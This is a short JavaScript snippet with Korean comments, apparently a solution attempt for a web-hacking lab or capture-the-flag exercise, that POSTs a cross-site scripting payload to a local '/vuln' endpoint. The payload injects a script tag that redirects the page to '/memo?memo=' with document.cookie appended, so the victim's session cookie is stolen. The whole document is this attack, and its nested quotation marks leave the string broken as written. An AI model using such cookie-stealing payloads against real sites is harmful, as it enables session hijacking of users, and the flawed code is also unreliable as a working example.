var xhr = new XMLHttpRequest();
var url = "http://127.0.0.1:8000/vuln?param="; // 요청을 보낼 URL

// POST 요청 설정
xhr.open("POST", url, true);
xhr.setRequestHeader("Content-Type", "text/plain"); // 요청 헤더 설정

var data = "<script src="/vuln?param=document.location='/memo?memo='+document.cookie"></script>";

// POST 요청 전송
xhr.send(data);